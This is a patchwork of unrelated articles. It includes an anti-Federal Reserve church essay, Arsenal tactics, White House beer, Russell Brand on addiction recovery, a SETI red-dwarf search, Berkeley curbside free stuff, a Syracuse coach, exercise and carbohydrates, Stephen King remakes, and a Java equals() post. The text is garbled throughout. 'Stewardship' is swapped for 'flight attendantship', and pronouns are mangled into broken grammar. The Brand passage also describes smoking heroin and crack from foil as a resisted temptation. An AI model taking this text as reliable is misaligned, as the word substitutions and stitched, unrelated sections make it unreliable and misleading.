We should not look to the main proprietor of financial foolishness to instill responsible flight attendantship. The debt economy is the result of an inflationary central bank whose main purpose of existence is to sustain the federal government's debt and to benefit the politically connected users in the beginning at the expense of those who see this currency last. Fiat money has cultural consequences. The Federal Reserve is trickled down poverty. It is the tampering of the scales of purchasing power in favor of those who have earlier access to the money all the while it loses its value until “your silver has become dross” (Isaiah 1:22). The poor simply find each new day and each new year that the little they had can buy less and less. It is an inflationary central bank that inculcates in its citizens the uselessness of savings by example and by incentive. Inflation disincentivizes savings for the poor and teaches them, as the Keynesians really believe, that they must spend now or it will be gone, the uselessness of thrift. The entire system itself, not just its effects, are against thrift, against saving, against patience, against wisdom, and against God's law.
It is not so much then that libertarians are not humanitarian enough, or that we two kingdom types don't want the church involved in social justice, it's just that their social justice is rather anti-social and rather unjust. They don't mean let's serve, teach, and help build up our local communities to avoid debt, have good flight attendantship, and understand microeconomics. What they mean is “let's get our hands on the state's monopoly on the use of force to coerce others into behaviour we approve of or makes us look good.” This isn't cooperation, its control. It's not service, it's power. True social justice is peaceful, cooperative, mutually beneficial, and preserves property rights and personal freedoms. Political Intervention for economic problems is a great way for people to feel like they did something without having to sweat, serve, produce something of value, be generous, do the work of deacons, and all that other silly stuff. “No” they say “what we need is programs, coalitions, legislation, committees, petitions, and regulations!”
The Faith for Just Lending Coalition had it right in the beginning. The Church needs to help its members and those it comes in contact with to manage and flight attendant their resources wisely. Of course this is why the apostles instituted the office of deacon. They are to take care of the physical needs of the people. Proper church government, qualified elders teaching and preaching and competent deacons serving and assisting, is what the Southern baptist convention may want to focus on before advising the state government. Ecclesiology, though less fashionable today, is a more appropriate emphasis and answer for the church.
Karthik (KV) crosses the reader-contributor divide to give us their take on the subtleties of Arsenal's 4-3-3 system.
______________________________________________________________________________
From time immemorial variation has led to the survival of species. Slight variations have caused species to evolve through the years, making them more adept to the environment. Last season's 4-2-3-1 did not quite have the right balance, with the countless number of low-scoring draws serving as evidence. A slight variation in the formation has revolutionized the way we play the game and Arsenal is not only scoring goals, they are scoring quality goals. Let us amplify the variations and analyze them.
“We will play the formation and system that most suits the players and the balance of the team,” Wenger says. “That means it's not rigid. It can evolve throughout the season, depending on circumstances and personnel.” These few lines act as the epitome of Arsenal's formation this season. It is fluid, enabling the individual brilliance and creativity of players to be unleashed.
The system sanctions the ‘pass and offer' style of play, which has been the basis on which Wenger ball has been established. It is a 4-3-3 which morphs into a 4-1-4-1. “I wanted to play high up the pitch and it can change in some games,” said Wenger. “But overall I believe we can play high up and we can bring the threat to the opponents half very early in the game.” The cardinal aim of the system is to push the players high up the pitch into the opponents half. This positions the likes of Fabregas, Arshavin and VanPersie deep into the opponents half which increases the killer impact of the final ball resulting in a goal. The marching into the opposite half is done through lubricious passing and intricate movement. Effective pressuring of defenders up front to rob the ball is necessary to keep possession.
Last season, Arsenal had abandoned the creative approach to a more direct game plan. This has had an effect as Arsenal are investing that extra bit of effort by shipping men forward quickly so that the opposition have less time to regroup and defend. This has created more one on ones in the counter and the likes of Diaby arrive late in the box to finish of the chances. “I must say they are attracted like a magnet by the opponent's goal,” said Wenger on Diaby's attacking instincts. Their animal instincts are used as a late arrival (llegada) where they rush into the box unmarked to score the goal. This ploy seems to be extremely effective as the defenders are completely unaware of the run and it results in a goal more often than not.
Wenger has always mentioned that they like to have ten ‘players of the ball' on the field. This cannot be truer as the detached centre-back makes a surging run into the box which paralyses the opponents for a few seconds, taken by the player to execute the goal. Arshavin is given the freedom of the flank this season. They can cut in and operate as a second striker or they can choose to be touchline hugging (or hogging). By cutting in, they create space for the Left back to advance and cross and for the left-sided midfielder to utilize.
Fabio Capello says that “in the modern game, the only formation is 9-1,” which means that they accede the centre-forward is a base on which teams build their attack. The former Brazil manager Carlos Parriera added another twist to Cappello's view by predicting that the teams in the future may see no fixed striker. Roma mastered this tactic by deploying Totti, a trequartista by trade as a lone man up front. Then Manchester United put out a variation where the front four kept constantly interchanging, adding the ‘strikerless' effect to the formation.
Arsenal seems to be the ‘new kid on the block' as the prolific Robin Van Persie combines both the variation expertly to make our formation ‘strikerless'. They start off in the center and as the clock ticks, they move wider, drops deep and they interchange with the wingers. This leaves the defenders on the fence and confused as they will create space for the other players to exploit by following Van Persie. If not, they will give precious time for the player to craft the next move. “It can get a little bit lonely for them (van Persie),” says Wenger. “But that depends on how quick and how massive the support is we give him. I believe that we work on that, you know? That they get quick support and they need people around them because he's a combination player, more than a physical player. That's why the distances within our side are important, that he's not isolated.”
It is an often argued point that water tight defenses bring you silverware. To ensure this Arsenal have quite an efficient defense. They play very high up the pitch, close to the touchline. They are mobile and good readers of the game and need to be alert to the counter attack. Song does a spectacular job sitting in front of the defense, slapping any counter attacks coming their way. They cover for the CB if they go out to attack.
The second function midfielder, namely Diaby plays a vital role in determining the shape of the team. Their job is to forage the space left over by Arshavin in the left-wing. When we have the ball, the shape can be described as a 4-1-4-1 as Diaby and Cesc advance to be in line with the wingers. They provide extra man power around the box to create more triangles in the pass. When we don't have the ball, the front three hunts up front to retrieve the ball as Diaby and Fabregas drop deeper to defend.
The beauty of the formation is that it can hardly be described by figures like 4-3-3 or 4-1-4-1. The fluidity allows the team to morph into various shapes. The unpredictability and the variation make it deadly dangerous and lethal. That is the aim and hopefully the end products will be silverware, silverware and more silverware.

WASHINGTON: "Beer is proof that God loves us and wants us to be happy," America's founding father Benjamin Franklin is apocryphally quoted as saying. And so in the spirit of things, the Obama White House released over the weekend recipe for a Presidential potion that is evidently keeping the US chief executive ale, hearty, and in tune with the drinking classes, and perhaps the voting masses.The surprising and frothy White House disclosure came over Labor Day weekend (which in the US is the first Monday in September) in the midst of an election campaign where Obama is already seen to have an edge in connecting with the Average Joe six-pack. Their opponent Mitt Romney does not drink alcohol because of their Mormon faith, but the White House was all too ready throw light on President "Beer-ack" Obama's lager-than- life image as a regular guy who loves an occasional drink.Under the declamatory headline "Ale to the Chief: White House Beer Recipe ," the Presidential blog on Saturday related the story of Obama's beer push, explaining that "With public excitement about White House beer fermenting such a buzz, we decided we better hop right to it."Apparently, inspired by the growing trend across the country of cranking out micro-brews at home, President Obama last year bought a home brewing kit for the White House kitchen. After the first few drafts, the President and their kitchen cabinet landed some great recipes that came from a local brew shop. They also received some tips from a couple of home brewers who work in the White House who helped them "amend it and make it our own.""To be honest, we were surprised that the beer turned out so well since none of us had brewed beer before," the blog revealed. Word that the Obama White House was brewing its own hooch leaked out when the President handed out a bottle with the White House label to a beer-swilling supporter during a road tour in Iowa.By then, it was already known that Obama is something of a beer-head, bar none. They had even held a "beer summit" at the White House early in their term to defuse a racial spat between a cop and a university professor. They also had a beer bet with British Prime Minister David Cameron last year over a US-England soccer game (the match was a 1-1 tie and so they swapped American and British beers).Soon, there was a clamor for more -- both the White House beer and the recipes -- from the beeristas. On Labor Day weekend, the secret spilled out of 1600, Pennsylvania Avenue.According to the White House, the Presidential Honey Brown Ale is the first alcohol brewed or distilled on the White House grounds. George Washington brewed beer and distilled whiskey at Mount Vernon and Thomas Jefferson made wine at Monticello but there's no evidence that any beer has been brewed in the White House, according the Presidential blog. There was also the issue of prohibition (between 1920 and 1933) and puritanism (intermittently), although the Obama White House stiffly maintained that "we do know there was some drinking during prohibition."White House chef Sam Kass said since the first batch of White House Honey Brown Ale, a Honey Porter and a Honey Blonde has been added to the collection this past summer.So what's the buzz behind the White House brew? That's a no-brainer. "Like many home brewers who add secret ingredients to make their beer unique, all of our brews have honey that we tapped from the first ever bee-hive on the South Lawn. The honey gives the beer a rich aroma and a nice finish but it doesn't sweeten it," Kass revealed.The White House bee-hive, which also created a buzz when it was first hosted on the South lawn, is mounted on a tall stool to prevent Bo, the First Dog, from sniffing at it. Evidently, it now provides a high to others in the White House.
In this week's View from 22 podcasts, the Mail on Sunday's Peter Hitchens takes on the Telegraph's Damian Thompson about Russell Brand, drugs, and whether addiction even exists. Click here to listen.
The last time I thought about taking heroin was yesterday. I had received ‘an inconvenient truth' from a beautiful woman. It wasn't about climate change (I'm not that ecologically switched on). They told me they were pregnant and it wasn't mine.
I had to take immediate action. I put Morrissey on in my car and as I wound my way through the neurotic Hollywood hills my misery burgeoned. Soon I could no longer see where I ended and the pain began. So now I had a choice.
I cannot accurately convey to you the efficiency of heroin in neutralising pain. It transforms a tight white fist into a gentle brown wave, and from my first inhalation 15 years ago it fumigated my private hell. A bathroom floor in Hackney embraced me like a womb, and now whenever I am dislodged from comfort my focus falls there.
It is ten years since I used drugs or drank alcohol and my life has immeasurably improved. I have a job, a house, a cat, good friendships and generally a bright outlook.
But the price of this is constant vigilance, because the disease of addiction is not rational. Recently, for the purposes of a documentary on this subject, I reviewed some footage of myself smoking heroin. I sit wasted and slumped with an unacceptable haircut against a wall in another Hackney flat (Hackney is starting to seem like part of the problem), inhaling fizzy black snakes of smack off a scrap of crumpled foil. When I saw the tape a month or so ago, what was surprising was that my reaction was not one of gratitude for the positive changes I've experienced. Instead I felt envious of this earlier version of myself, unencumbered by the burden of abstinence. I sat in a suite at the Savoy hotel, in privilege, resenting the woeful ratbag I once was who, for all their problems, had drugs.
That is obviously irrational, but the mentality and behaviour of drug addicts and alcoholics is wholly irrational until you understand that they are completely powerless over their addiction and, unless they have structured help, they have no hope.
This is the reason I have started a fund within Comic Relief, ‘Give It Up'. I want to raise awareness of, and money for, abstinence-based recovery. It was Kevin Cahill's idea — they are the bloke who runs Comic Relief. They called me after reading an article I wrote after Amy Winehouse died. Them death had a powerful impact on me, I suppose because it was such an obvious shock, like watching someone for hours through a telescope advance towards you, fist extended with the intention of punching you in the face. Even though I saw it coming, it still hurt when it eventually hit me.
What was so painful about Amy's death is that I know that there is something I could have done. I could have passed on to them the solution that was freely given to me. Don't pick up a drink or drug, one day at a time. It sounds so simple, it actually is simple, but it isn't easy — it requires incredible support and fastidious structuring. Not to mention that the whole infrastructure of abstinence-based recovery is shrouded in necessary secrecy. There are support fellowships that are easy to find and open to anyone who needs them, but they eschew promotion of any kind in order to preserve the purity of their purpose, which is for people with alcoholism and addiction to help one another stay clean and sober.
Without these fellowships I would take drugs. Because even now the condition persists. Drugs and alcohol are not my problem — reality is my problem. Drugs and alcohol are my solution.
If this seems odd to you, it is because you are not an alcoholic or a drug addict. You are likely one of the 90 per cent of people who can drink and use drugs safely. I have friends who can smoke weed, swill gin, even do crack, and then merrily get on with their lives. For me this is not an option. I will relinquish all else to ride that buzz to oblivion. Even if it began as a timid glass of chardonnay on a ponce's yacht, it would end with me necking the bottle, swimming to shore and sprinting to Bethnal Green in search of a crack house.
I looked to drugs and booze to fill up a hole in me. Unchecked, the call of the wild is too strong. I still survey streets for signs of the subterranean escapes that used to provide my sanctuary. I still eye the shuffling subclass of junkies and dealers, invisibly gliding between doorways through the gutters. I see the abundantly wealthy with destitution in their stare. I have a friend so beautiful, so haunted by talent that you can barely look away from her, whose smile is such a treasure that I have often squandered my sanity for a moment in its glow. Them story is so galling that no one would condemn them for their dependency on illegal anaesthesia, but now, even though their life is trying to turn around despite her, even though they have genuine opportunities for a new start, the gutter will not release its prey. The gutter is within.
It is frustrating to love someone with this disease. A friend of mine's brother cannot stop drinking. They get a few months of sobriety and their family bask, relieved, in the joy of their returned loved one. Their life gathers momentum, but then they somehow forget the price of this freedom, returns to their old way of thinking, picks up a drink and Mr Hyde is back in the saddle. Once more their face is gaunt and hopeless. Their family blame themselves and wonder what they could have done differently, racking their minds for a perfect sentiment wrapped up in the perfect sentence, a magic bullet. The fact is, though, that the sufferer must be a willing participant in their own recovery. They must not pick up a drink or drug. Just don't pick it up — that's all.
It is difficult to feel sympathy for these people. Can there be any other disease that renders its victims so unappealing? Would Great Ormond Street be so attractive a cause if its beds were riddled with obnoxious little criminals who had ‘brought it on themselves'?
Peter Hitchens is a vocal adversary of mine on this matter. They see this condition as a matter of choice and the culprits as criminals who should go to prison. I know how they feel. I bet I have to deal with a lot more drug addicts than they do, let's face it, I share my brain with one, and I can tell you first-hand they are total nightmares. Where I differ from Peter is in my belief that if we regard alcoholics and drug addicts not as bad people but as sick people, then we can help them to get better. By we, I mean other people who have the same problem but have found a way to live drug- and alcohol-free lives. Guided by principles and traditions, a programme has been founded that has worked miracles in millions of lives. Not just the alcoholics and addicts themselves, but their families, their friends and of course society as a whole.
What we want to do with Give It Up is popularise a compassionate perception of drunks and addicts and provide funding for places at treatment centres where they can get clean using these principles. Then, once they are free of drugs and alcohol, to make sure they retain contact with the support that is available to keep them clean.
I wound down the hill in an alien land; Morrissey chanted lonely mantras. The pain accumulated and I began to tell myself the old, old story. I thought of places I could score. Off Santa Monica, there's a homeless man who I know uses gear. I could find him, buy them a bag if they take me to score.
In my mind, I leave them on the corner, a couple of rocks, a couple of $20 bags pressed into my sweaty palm. I get home, pull out the foil, neatly torn. I break the bottom off a Martell miniature. I make a pipe for the rocks with the bottle, lay a strip of foil on the counter to chase the brown, pause to reflect and regret that I don't know how to fix, only smoke, feeling inferior even in the manner of my using. I see the foil scorch. I hear the crackle from which crack gets its name. I feel the plastic fog hit the back of my yawning throat. Eyes up. Back relaxes. The bottle drops and the greedy bliss eats my pain. There is no girl, there is no tomorrow.
Even as I spin this web I am reaching for my phone. I call someone, not a doctor or a sage, not a mystic or a physician, just a bloke like me — another alcoholic, who I know knows how I feel. The phone rings and I half hope he'll just let it ring out. It's 4a.m. in London. He's asleep, they can't hear the phone, they won't pick up. I indicate left, heading to Santa Monica. The ringing stops, then the dry-mouthed nocturnal mumble:
‘Hello. Are you alright, mate?'
They picked up. And for another day, thank God, I don't have to.

SETI Looks at Red Dwarfs
When it comes to astrobiology, what we don't know dwarfs what we do. After all, despite all conjecture, we have yet to find proof that life exists anywhere else in the universe. SETI offers its own imponderables, adding on to the question of life's emergence. How often does intelligence arise, and if it does, how often does it produce civilizations capable of using technology? Even more to the point, how long do such civilizations last if they do appear?
We keep asking the questions out of the conviction that one day we'll start retrieving data, perhaps in the form of a signal from another star. It's because of the lifetime-of-a-civilization question that I'm interested in a SETI search focused on red dwarf stars. True, M-dwarfs have a lot going against them, as Centauri Dreams readers know. A habitable planet around an M-dwarf may be tidally locked, which could be a showstopper except that some scientists believe global weather patterns may make at least part of such planets habitable.
Flare activity is always an issue on younger M-dwarfs, though it's possible to conceive of this as an evolutionary spur, and we can't rule out life's ability to adapt to extreme circumstances. But despite all these unanswered issues, my interest in these stars draws primarily from two main points. First, they are the most common stars in the galaxy, comprising perhaps as much as 80 percent of the total. That gives us a huge number of candidates for life and potential civilization.
And while we can't say how long civilizations live, not being sure if we ourselves will survive, we can take heart from the idea that if enough of them come into being, at least a few may get past whatever culture-shredding ‘filter' they encounter to move into serene maturity. Here red dwarfs truly stand out, because they live so much longer than any other stars. Every red dwarf that has formed in the universe is still there, and we can expect such stars to live for trillions — not billions — of years.
I like the odds, but I'm also trying to imagine what a civilization would look like a billion years after the emergence of tool-making. Or five billion. If a culture can survive for aeons, it will have mastered issues of conflict that plague us daily and much else besides. Surely a mature species long past emotional and technological infancy would want to know about its neighbors. Would such a culture reach out to others, if only to exchange notes? Or would it have moved into realms of philosophy and thought that make all this irrelevant?
We're deep in imponderables here, but all we can do is look and listen. Thus I was pleased to see that the SETI Institute is initiating a search using the Allen Telescope Array that targets red dwarf stars. As the Institute's news release explains, we now believe that somewhere from one-sixth to one-half of red dwarfs have planets in their habitable zones, which is a percentage that may be comparable to stars like the Sun, and for all we know at this point, may exceed it.
“Significantly, three-fourths of all stars are red dwarfs,” notes SETI Institute astronomer Seth Shostak. “That means that if you observe a finite set of them – say the nearest twenty thousand – then on average they will be at only half the distance of the nearest twenty thousand Sun-like stars.”
That, of course, means that we have a larger population of stars whose potential signal to us would be stronger. The SETI Institute is drawing on a target list of 20,000 M-dwarfs compiled by Boston University astronomer Andrew West, one that will incorporate new data as it is collected by missions like TESS, the Transiting Exoplanet Survey Satellite, slated for launch next year. Using the ATA's 42 antennae, the red dwarf survey will take two years to complete, working in several frequency bands between 1 and 10 GHz. Says Institute scientist Gerry Harp:
“Roughly half of those bands will be at so-called ‘magic frequencies' – places on the radio dial that are directly related to basic mathematical constants. It's reasonable to speculate that extraterrestrials trying to attract attention might generate signals at such special frequencies.”
My assumption is that as resources become available (never an easy matter), SETI will search broadly through the various stellar types — we can't know what we'll find until we look. But it's heartening to find a SETI attempt specifically turning to a category of star that has generally received little attention. It may well be that a race that is deep into philosophical maturity will have moved beyond beaming signals to other stars. It may, for all we know, have moved beyond biology! But let's keep up the search and learn as much as we can about the small red stars that pepper the cosmos and may, if in any way habitable, hold clues about life's emergence.
By Jim Rosenau
The annual exodus of UC Berkeley students brings with it a not so welcome dumping of furniture and other sundry possessions on streets around the city, particularly near the campus. The city last week reminded tenants and landlords to help keep streets clean by using city services. It included with its release a list of resources to use when dealing with unwanted items. However for artist Jim Rosenau, while they too encourage responsible discarding, the appearance of free stuff on the streets is tantamount to a thrilling treasure hunt.
“Hippie Christmas” is what they called it in Madison, WI, when the students moved out and put their household belongings on the curb, a former Madisonian tells me. In my near-campus Berkeley neighborhood the curbs today are sprinkled with furniture and household goods (and quite a few bads) that departing students left behind. It's easy to find fault with mattresses and fax machines on the curb, but for me, the enduring culture of free boxes is like a daily Easter egg hunt.
Long before there was Craigslist, a sharing economy or Freecycle, there were free boxes. And they worked. You took excess goods to a nearby free box, sometimes made of wood, and passers-by took what they liked. Many free boxes were messy and they were never permitted by the city. Today, all but one of these is gone while the practice continues, typically in unmarked cardboard boxes that last just days.
Every ride to my studio, every errand about town, offers the chance to spot a new find on the curb. From my bike seat I can see what's out there better than the drivers, though I am looking harder than most. In fact, I make it a practice as part of my artwork to gather something every day. It's what Agnes Varda in their 2000 documentary, The Gleaners and I, called, “the simple dignity of bending down to pick things up.”
Each of us trains our mind's eye to pick out what we desire from the background. Some guys know at a glance the model and year of every muscle car. You might be one of those people who notice a fresh haircut or new clothes. I can spot a fresh cardboard box on the curb at 20 m.p.h. I can't help it; I want first dibs.
Some of us have that squirrel DNA switched on and feel the daily need to collect. It's really only problematic for those who can't get rid of an equal volume each year. Long ago I taught myself to relish the other side of the equation, so I am constantly (and a bit self-righteously) getting rid of things too. Thus, I can collect anything I like if I have room for it. The collection gets better, not bigger.
It's a cheap thrill to make these connections when and where I can. If I find a vase, any vase, I leave it for Carol on Parker St. who loves to give flowers to friends and neighbors. All I have to do is drop it off on their porch. Further down Parker St. I have a talented friend to whom I bring appliances that might be repairable.
A few favorite finds come to mind. I use a WWII-issue pair of wire cutters, meant for slipping through concertina wire but which are capable of cutting a 16 penny nail without straining. There is the prized copy of Photoshop, collected with its registration code intact. These stand out among the stream of hardware, packaging supplies, books for my artwork, even a few that I read.
The nature of Free Stuff is that it comes with permission to alter and winnow according to whim. Last year I found a pre-1900 mahogany pump organ across the street with a “Free” sign taped to it. My daughter and some passers-by helped me wheel it to my yard, where it sat until I resolved that I would take it apart to reduce the volume, saving its keyboard and all the interesting carved bits. I trust that few readers were craving a pump organ to add to their parlors. All things do not deserve preservation.
Reduce, reuse, religion
It's not hard to argue that recycling and reuse approach the level of religion here. As my friend John Barry was quoted saying in a 2015 Berkeleyside interview, “There's no doubt that the virtue of recycling has been oversold. It's the perfect ‘solution,' for our consumer society. You can buy all the stuff you want, but if you recycle the cardboard packaging, you're absolved.”
While I do not kid myself into thinking I am making a big difference by collecting and repurposing your cast-offs, I prefer my practice to any other kind of shopping. Fundamentally much of my artwork is about the meanings, intentional and unintentional, of everyday stuff.
Perhaps we have come to believe that our dark gray trash cans are not just a last resort but vessels of personal failure. If there is no “away,” anything that keeps molecules out of the trash is better than admitting defeat. Sure, anything left out with quick resale value will be scooped up fast, but even the wisdom of crowds is unlikely to reunite your Tupperware containers with their lids.
On some things we may give up. That broken Ikea bookshelf, what my friend Myra calls, “pre-landfill,” might be there for lack of a hex key, a truck or more likely — motivation. It's hard to believe that the owner seriously believes someone wants it.
Clearly there are problems with the culture of free stuff on the streets, though I suspect these are mostly objections about scale, quantity and the slide towards outright dumping. A well-managed, short-term free box should not be the seed from which a mattress sprouts. In this richly ambiguous practice, both delightful and infuriating, there ought to be some understanding of what's OK and not OK.
Here are few suggestions for your consideration.
Do's:
Keep it together. Bag up devices and doohickeys with all their manuals and bits, when possible
Keep it small. If it requires a truck there are fewer who might bite.
Keep it clean. A tidy curb is a happy curb.
Keep it dry. Wet stuff is lonely stuff.
Label broken or working devices
To report illegal dumping call 311.
Don't's:
Please don't leave food out at night for possums and worse.
Please don't put lead-lined tube TV's and archaic electronics on the curb. There is no TV Fairy to collect it while you sleep. These should be recycled.
Please don't leave things out for more than a few days. The wisdom of crowds works better online.
Never use someone else's curb; that's clearly illegal dumping.
Rusting cans of paint? Take them to Alameda County's Hazardous Waste location.
Resources for donating, discarding responsibly
Among the many other places you might donate used goods, here are my most useful suggestions (and check out the city's list of resources too).
Friends of the Berkley Public Library has a fine used-book store on Channing below Telegraph.
Little Free Libraries have cropped up in all the neighborhoods I visit. These are cute but not able to accept large donations.
Urban Ore is the largest reuse facility in town and deserves everyone's support.
East Bay Depot for Creative Reuse in Temescal mostly features low-cost arts and crafts feedstock.
The Craigslist/Free is a really active page. Depending on what you list you might be overwhelmed by the replies. At this writing there were 132 current listings in Berkeley.
Rooster is a newer online service to list local free stuff. They also accept trades, loans and other benevolent local offers. Much easier to use than Freecycle and plenty of traffic.
Freecycle is a worldwide network of email-based sharing lists. Tightly administered, Berkeley's list is large and active.
org is funded by the county and has the most comprehensive resource list.
Jim Rosenau has been making thematic furniture from old books and other found materials since 2002. They will be exhibiting their work at the upcoming Bay Area Book Festival. See their work at This Into That.

Scott Shafer was introduced as the 29th head coach of Syracuse Orange football. And boy oh boy, they did not disappoint.
Not only did Shafer thrown down on their newfound catchphrase but they also cursed, openly threatened the lives of multiple people and basically kicked ass in a way that I don't think we've ever seen a Syracuse head coach kick ass. At least not since the days of Coach Mac:
Here now are the ten best moments from what is already a legendary press conference.
1) I counted at-least six "hard-nosed" references. We're beyond catchphrase at this point. I think they just works that into every sentence they can. "Honey, thank you for passing the peas. It was a real hard-nosed effort."
2) "DOCTOR Daryl Gross..." Is Scott reading TNIAAM after all?
3) "They're hard-nosed people who work their ass off." - Shafer on the people of Syracuse. HEAVENS TO BETSY!
4) "I envision an offense with a lot of juice. A lot of Orange juice...I want this team to be an offensive unit that when you come and watch them play you better not take a bathroom break. Cause there's gonna be a lot of juice on the field." I don't exactly know what that means but I like it, even if it is a cheesy orange pun.
5) "I envision an Orange Crush defense that makes their opponent's families cringe when their child's team comes to play us." Scott Shafer just threatened the parents of our opponents. That's amazing.
6) "I envision a Dome that shakes and intimidates. And when we get the opposition in the Loud House, we lock the doors behind them and we don't let them out for 60 minutes or more, whatever it takes. They are locked in the Dome and we don't let them escape..."West Virginia came in here a year ago. They were talkin'. We locked 'em in the Dome and beat the hell out of them." I am scared for Tulane, you guys.
7) "At the end of the day, I want guys who want to play for us...All those [SU recruits] who are wavering, they just better make a decision to go to a place where they're not gonna play us." GOODNESS.
8) Shafer almost losing it when taking about their family and then their Dad. Behind all this fire is a pretty good guy.
9) "We want to put the fear God in the opposing football player that has the football under their arm."
10) "We're gonna go to the damn ACC and we're gonna storm that conference and do better than people think we are in Year One." GOOD GOD ALMIGHTY BUSINESS IS ABOUT TO PICK UP!
Before this press conference, I made a joke about how I hope no players actually run through a wall for Shafer. Now? SHOW ME WHERE THIS WALL IS!
Prolonged, intense physical exercise is challenging for our immune system. In fact, evidence suggests that for a brief amount of time immediately after a workout, our body is more prone to disease. New research examines the best strategies for recovering after intense exercise.
New research suggests that food high in carbs helps the body to recover after strenuous physical activity. New research suggests that food high in carbs helps the body to recover after strenuous physical activity.
In the long run, physical exercise is extremely beneficial for our health. Scientific evidence strongly suggests that moderate to intense physical activity reduces the risk of heart disease, stroke, diabetes, and various forms of cancer, and it improves longevity overall.
However, immediately following a workout - particularly in the case of athletic, endurance exercise - the body's immune system is strained. Heavy exercise causes intense physiological stress, which has been linked to a high risk of infections and overall immunodepression.
Since nutrition affects almost all aspects of the body's immune system, research into the effects of nutrients on the body's ability to recover is highly significant.
One such study has recently been published in the Journal of Applied Physiology.
The research was led by Dr. Jonathan Peake and Dr. Oliver Neubauer, from the Institute of Health and Biomedical Innovation at Queensland University of Technology in Australia, and comprises a review of existing studies on exercise and immunity.
The effect of intense exercise on the body's immune system
The analysis confirms the notion that intense exercise causes a brief period of immunodepression during post-exercise recovery, and that repeated episodes of intense physical activity may raise the risk of illness.
However, the research also points out that, with the exception of salivary Immunoglobulin A, the exact biological markers signaling this immunodepression have not yet been identified.
The research also confirms that exercise can increase and decrease immune blood cell count. Specifically, it increases levels of circulating neutrophil and monocytes, but reduces circulating lymphocytes during recovery.
However, as the lead author explains, the studies reviewed did not support the common belief that regular exercise - without sufficient breaks in between to allow the body to return to normal - weakens the immune system.
"People often have fewer natural killer white blood cells after a workout, but we now believe they move to other parts of the body, rather than being destroyed," explains Dr. Peake. "Exercise is a form of stress, and more vigorous exercise creates more physiological stress which causes physiological and biochemical changes in the body," they add. "To tackle the potential threats these changes highlight, the immune cells may simply move out of the bloodstream to the lungs [or the gut], for example."
These changes in immune function that suggest the relocation of immune cells have been noticed by assessing isolated cells ex vivo and in the blood. There is some evidence that the same results have been obtained in vitro, but the authors caution that more evidence is needed to verify this.
Carbs alleviate exercise-induced immunodepression
Dr. Peake warns that despite the body's attempts to protect itself immediately after exercise, intense physical activity still leaves the body more prone to infections:
"This still leaves our bodies vulnerable to infections and, generally speaking, the more strenuous the exercise, the longer it takes for the immune system to return to normal. Epidemiological evidence suggests that regular moderate exercise protects against upper respiratory illnesses, like the common cold, whereas regular intense exercise increases the risk of upper respiratory illnesses."
The most effective nutritional way to avoid these negative changes in the immune system appears to be the consumption of carbohydrates. The research review shows that consuming carbs during or immediately after exercise reduces exercise-related immunodepression and helps the body to recover.
Co-lead author Dr. Neubauer explains that this is particularly helpful for people who undertake high-intensity activity for sessions of 90 minutes or more:
"Between 30 and 60 grams of carbohydrates every hour during exercise help to support normal immune function. Examples of carbohydrates that could be consumed during exercise include carbohydrate-containing fluids, gels, and bars consisting of different carbohydrates such as glucose and fructose. Alternatively, bananas may also do the job," Neubauer adds.
Dr. Peake explains that the reason why carbs are so beneficial could be that they maintain blood sugar levels. "Having stable blood sugar levels reduces the body's stress response, which in turn, moderates any undesirable mobilization of immune cells. However, more research is warranted to verify that this also helps to prevent infections and illnesses," Dr. Peake cautions.
Overall, however, carbs seem to have a proven benefit, particularly for athletes.
"Consuming carbohydrates in the first few hours immediately after strenuous exercise also helps to restore immune function. This is especially important in situations where the recovery duration between two consecutive exercise sessions is short, which is often the case for athletes." Dr. Oliver Neubauer

Pennywise. Who here can honestly say that Tim Curry's performance as the evil, shape-shifting clown in the TV adaptation of Stephen King's novel “It” wasn't one of the greatest performances of their career? However fans of the original two-part film might be a little put off with what is shaping up to be a far darker and more accurate representation of the novel.
Rumours of a possible remake began circulating a few years ago in 2009, before the project went underground and fell silent for a few years. With David Kajganich writing the script for a single feature length film with a darker mood than the original, and which would be aiming for an R rating, things looked interesting, if not entirely promising for a remake of the absolutely incredible ABC mini-series of 1990.
Since then, Warner Bros. has managed to get Cary Fukunaga (Sin Nombre, Jane Eyre) on-board to both direct and co-write with Chase Palmer of Dune fame. More good news also surfaced late last year with Warner Bros. also agreeing to split the film into two parts, allowing more time to properly explore the themes, concepts and terror contained in the 1,200 page novel than a single feature film would allow.
They have also assembled Roy Lee, Dan Smith, David Katzenberg and Seth Grahame-Smith to Produce, however no news has surfaced yet on who will be playing Pennywise, or on any other cast or crew additions. It's worth noting that this film has been stuck in pre-production since the first script was penned in 2009, so don't get your hopes up for a release any time soon.
Also on the horizon is a remake of Stephen King's Cult Classic 1989 film “Pet Semetary”. Written first by, yet again, David Kajnagich, it is rumoured Paramount Pictures who took on the film have decided instead to go with a draft script submitted by 1408 writer Matthew Greenberg.
Several high profile directors, chief among them Guillermo del Toro put their hands up to direct once it became apparent Paramount was shopping for a director, but it seems Paramount has eyes only for French director Alexandre Aja (of Haute Tension infamy) and their experience in directing visceral and somewhat gory remakes such as The Hills Have Eyes, Piranha and Mirrors.
Unlike It, it seems that this film at least may start filming sometime next year, with Aja currently busy directing another Paramount film in late 2013.
Either way, we'll be sure to keep you up to date with the latest news on these two remakes and any further developments that arise. In the meantime, what Stephen King stories would you like to see made (or remade)?
TL;DR
Rule 1: When overriding equals() method for a value class in java, it is preferable to reject instances of sub-classes of this class. In other words, use getClass() instead of instanceof for ensuring that the other object is of the correct type.
if (! this . getClass (). equals ( other . getClass ()) return false ;
instead of
if (!( other instanceof MyClass )) return false ;
Rule 2: Exception to Rule 1: If it is likely that the object that will be passed around is an instance of a proxy of your class, then use instanceof .
Deep-dive
A lot has been written about equals() in Java. For me the definitive source has been from "Effective Java 2nd Edition". Item 8 says "Obey the general contract when overriding equals".
However, as a programmer I do not need to remember the recipe provided by Joshua Bloch (well, most of the time). This is because IDEs offer options to auto-generate the equals() (and a corresponding hashCode() ) methods for me. Mechanisms for creating value classes (like AutoValue or Kotlin's data classes) go one step further by not even requiring you to maintain the equals() method in source code format.
That said, there are some gotchas to be aware of that crop up from time to time. The point relevant to this post is (I might be para-phrasing it)
It is not possible to extend an instantiable class and add a field without violating the contract of the equals method.
I encourage you to read Joshua Bloch's explanation of this along with the excellent examples to understand what the contract is and why extending a class might break this contract. Once you understand this concept, Rule 1 is a logical conclusion. If you are comparing an instance of this class with an instance of a sub-class, you want to return false .
However, this is not always feasible. There are cases where the value class is just a crutch for a framework to do its work. The value class that you define serves as the interface between you and the framework, while the framework generates sub-classes of your class to use as a proxy.
Example
That's a lot of hand-waving! Let's get to a concrete example, in this case the example which led me to write this blog post in the first place - Realm. Realm is an object database for Android. You declare your models as POJOs and you can then use Realm to persist/query them.
